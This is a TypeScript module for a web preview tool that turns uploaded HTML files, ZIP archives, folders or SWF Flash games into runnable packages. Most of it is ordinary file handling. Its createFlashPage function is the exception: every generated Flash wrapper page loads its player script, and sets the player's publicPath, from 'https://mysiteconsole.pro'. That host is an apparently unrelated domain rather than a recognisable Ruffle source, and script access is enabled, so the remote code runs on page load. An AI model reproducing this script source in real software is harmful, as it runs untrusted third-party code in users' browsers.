import { unzipSync } from "fflate";

export interface IncomingFile {
  file: File;
  path: string;
}

export interface PreviewFile {
  path: string;
  data: Uint8Array;
  type: string;
}

export interface HtmlPackage {
  name: string;
  entryPath: string;
  files: PreviewFile[];
}

const PAGE_EXTENSION = /\.(html?|xhtml|svg|txt)$/i;
const HTML_EXTENSION = /\.(html?|xhtml)$/i;
const FLASH_EXTENSION = /\.swf$/i;

function createFlashPage(swfPath: string) {
  const swfUrl = JSON.stringify(swfPath).replace(/</g, "\\u003c");
  return `<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>Flash game</title>
  <style>
    html,body,#game{width:100%;height:100%;margin:0;overflow:hidden;background:#111}
    #game{display:grid;place-items:center}#game>*{width:100%;height:100%}
    #status{position:fixed;inset:0;display:grid;place-items:center;margin:0;color:#fff;background:#111;font:16px system-ui;z-index:2}
  </style>
  <script>
    window.RufflePlayer = window.RufflePlayer || {};
    window.RufflePlayer.config = {
      publicPath: "https://mysiteconsole.pro",
      autoplay: "on",
      letterbox: "fullscreen",
      scale: "showAll",
      allowScriptAccess: true,
      contextMenu: true,
      warnOnUnsupportedContent: false
    };
  </script>
  <script src="https://mysiteconsole.pro"></script>
</head>
<body>
  <div id="game"></div>
  <p id="status" role="status">Starting game…</p>
  <script>
    (async () => {
      const status = document.getElementById("status");
      try {
        const player = window.RufflePlayer.newest().createPlayer();
        document.getElementById("game").appendChild(player);
        await player.ruffle().load({ url: ${swfUrl} });
        status.remove();
      } catch (error) {
        status.textContent = "This Flash game could not start: " + (error && error.message ? error.message : String(error));
        status.setAttribute("role", "alert");
      }
    })();
  </script>
</body>
</html>`;
}

function normalizedPath(path: string) {
  const parts = path.replace(/\\/g, "/").split("/");
  const clean: string[] = [];

  for (const part of parts) {
    if (!part || part === ".") continue;
    if (part === "..") return null;
    clean.push(part);
  }

  return clean.join("/");
}

function pageRank(path: string) {
  const lower = path.toLowerCase();
  const fileName = lower.split("/").pop() ?? lower;
  const extensionRank = HTML_EXTENSION.test(lower) ? 0 : lower.endsWith(".svg") ? 1 : 2;
  const indexRank = /^index\.(html?|xhtml)$/.test(fileName) ? 0 : 1;
  const depth = lower.split("/").length;
  return { extensionRank, indexRank, depth };
}

function comparePages(a: string, b: string) {
  const rankA = pageRank(a);
  const rankB = pageRank(b);
  return (
    rankA.extensionRank - rankB.extensionRank ||
    rankA.indexRank - rankB.indexRank ||
    rankA.depth - rankB.depth ||
    a.localeCompare(b)
  );
}

/** Build a runnable package and remove the single wrapper folder many ZIPs add. */
export function createHtmlPackage(entries: PreviewFile[], name = "HTML package"): HtmlPackage {
  const cleaned = entries.flatMap((entry) => {
    if (entry.path.endsWith("/")) return [];
    const path = normalizedPath(entry.path);
    if (!path || path.startsWith("__MACOSX/") || path.endsWith("/.DS_Store")) return [];
    return [{ ...entry, path }];
  });

  const firstPath = cleaned[0]?.path;
  const wrapper = firstPath?.includes("/") ? firstPath.split("/")[0] : undefined;
  const files = wrapper && cleaned.every((entry) => entry.path.startsWith(`${wrapper}/`))
    ? cleaned.map((entry) => ({ ...entry, path: entry.path.slice(wrapper.length + 1) }))
    : cleaned;

  const pages = files.filter((entry) => PAGE_EXTENSION.test(entry.path)).map((entry) => entry.path);
  pages.sort(comparePages);
  const htmlPages = pages.filter((path) => HTML_EXTENSION.test(path));
  const flashPath = files.find((entry) => FLASH_EXTENSION.test(entry.path))?.path;
  const entryPath = htmlPages[0] ?? (flashPath ? "index.html" : pages[0]);

  if (!entryPath) {
    throw new Error("No HTML page or Flash game found. Include an HTML file, SWF, ZIP, or folder containing one.");
  }

  if (!htmlPages.length && flashPath) {
    files.unshift({
      path: entryPath,
      data: new TextEncoder().encode(createFlashPage(flashPath)),
      type: "text/html",
    });
  }

  return { name, entryPath, files };
}

export function createStandalonePackage(code: string): HtmlPackage {
  return {
    name: "Pasted HTML",
    entryPath: "index.html",
    files: [{ path: "index.html", data: new TextEncoder().encode(code), type: "text/html" }],
  };
}

export async function packageFromFiles(incoming: IncomingFile[]): Promise<HtmlPackage> {
  if (incoming.length === 0) throw new Error("Choose an HTML file, ZIP, or folder first.");

  if (incoming.length === 1 && incoming[0]?.file.name.toLowerCase().endsWith(".zip")) {
    const source = incoming[0];
    const archive = unzipSync(new Uint8Array(await source.file.arrayBuffer()));
    const entries = Object.entries(archive).map(([path, data]) => ({
      path,
      data,
      type: "",
    }));
    return createHtmlPackage(entries, source.file.name);
  }

  if (incoming.some(({ file }) => file.name.toLowerCase().endsWith(".zip"))) {
    throw new Error("Upload a ZIP by itself, or select its extracted files together.");
  }

  const files = await Promise.all(
    incoming.map(async ({ file, path }) => ({
      path: path || file.webkitRelativePath || file.name,
      data: new Uint8Array(await file.arrayBuffer()),
      type: file.type,
    })),
  );

  const firstPath = incoming[0]?.path ?? "";
  const folderName = firstPath.includes("/") ? firstPath.split("/")[0] : undefined;
  const name = incoming.length === 1 ? incoming[0]?.file.name ?? "HTML file" : folderName ?? "HTML package";
  return createHtmlPackage(files, name);
}

export function packageEntryCode(htmlPackage: HtmlPackage) {
  const entry = htmlPackage.files.find((file) => file.path === htmlPackage.entryPath);
  return entry ? new TextDecoder().decode(entry.data) : "";
}

export function updatePackageEntry(htmlPackage: HtmlPackage, code: string): HtmlPackage {
  return {
    ...htmlPackage,
    files: htmlPackage.files.map((file) =>
      file.path === htmlPackage.entryPath
        ? { ...file, data: new TextEncoder().encode(code), type: file.type || "text/html" }
        : file,
    ),
  };
}

export function packagePages(htmlPackage: HtmlPackage) {
  return htmlPackage.files.filter((file) => HTML_EXTENSION.test(file.path)).map((file) => file.path);
}

export function filesFromFileList(fileList: FileList | File[]): IncomingFile[] {
  return Array.from(fileList).map((file) => ({
    file,
    path: file.webkitRelativePath || file.name,
  }));
}

function readFileEntry(entry: FileSystemFileEntry): Promise<IncomingFile> {
  return new Promise((resolve, reject) => {
    entry.file(
      (file) => resolve({ file, path: entry.fullPath.replace(/^\/+/, "") }),
      reject,
    );
  });
}

function readDirectoryBatch(reader: FileSystemDirectoryReader): Promise<FileSystemEntry[]> {
  return new Promise((resolve, reject) => reader.readEntries(resolve, reject));
}

async function readDroppedEntry(entry: FileSystemEntry): Promise<IncomingFile[]> {
  if (entry.isFile) return [await readFileEntry(entry as FileSystemFileEntry)];
  if (!entry.isDirectory) return [];

  const reader = (entry as FileSystemDirectoryEntry).createReader();
  const children: FileSystemEntry[] = [];
  while (true) {
    const batch = await readDirectoryBatch(reader);
    if (batch.length === 0) break;
    children.push(...batch);
  }

  const nested = await Promise.all(children.map(readDroppedEntry));
  return nested.flat();
}

/** Read every dropped file, recursively including folders when the browser exposes them. */
export async function filesFromDrop(dataTransfer: DataTransfer): Promise<IncomingFile[]> {
  const entries = Array.from(dataTransfer.items)
    .map((item) => item.webkitGetAsEntry?.())
    .filter((entry): entry is FileSystemEntry => entry !== null && entry !== undefined);

  if (entries.length > 0) {
    const nested = await Promise.all(entries.map(readDroppedEntry));
    return nested.flat();
  }

  return filesFromFileList(dataTransfer.files);
}
